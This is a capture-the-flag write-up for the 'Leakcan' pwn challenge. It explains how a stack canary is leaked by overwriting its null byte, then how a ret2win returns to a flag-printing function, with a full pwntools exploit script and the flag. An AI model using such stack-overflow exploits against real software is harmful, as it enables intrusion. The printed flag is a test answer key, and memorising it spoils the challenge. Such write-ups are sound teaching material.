https://ctftime.org/event/2639

# Leakcan (pwn)

The government has declared a mandatory population census. Every citizen must provide their name and city of residence. Officially, it says just a formality, but whispers in the underground say the data will be used to tighten the regimes grip. Will you comply... or steal the secret file and hand it over to the democratic opposition?

nc leakcan-25b8ac0dd7fd.tcp.1753ctf.com 8435

## Analysis

```bash
$ pwn checksec ./leakcan_chall
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

`main` @ `0x4017b5`:

- Calls `read(0, local_68, 0x78)` twice
    - This lets us leak the canary by sending 0x59 bytes and reading the next 7 bytes
        - Note that if we `sendlineafter` with 0x58 `b"A"`'s and this will also send a new line totally 0x59 bytes
            - This is important because it stomps the first byte of the canary which is also zero
    - This lets us control the return address on the stack if we know the canary
        - Since there is no PIE we can just return to `your_goal` which prints the flag

## Solution

1) Leak the canary
2) ret2win

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./leakcan_chall", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("leakcan-25b8ac0dd7fd.tcp.1753ctf.com", 8435)

p.sendlineafter(b"What's your name", b"A" * 0x58)
p.readline()
p.readline()
canary = u64(b"\x00" + p.recv(7))

payload = b""
payload += b"A" * 0x58
payload += p64(canary) + p64(0)
payload += p64(elf.sym["your_goal"])
p.sendline(payload)

p.readuntil(b"1753c{")
print("1753c{" + p.readuntil(b"}").decode()) # 1753c{c4n4ry_1f_th3r35_4_m3m_l34k}
```

## Flag
`1753c{c4n4ry_1f_th3r35_4_m3m_l34k}`

smiley 2025/04/12
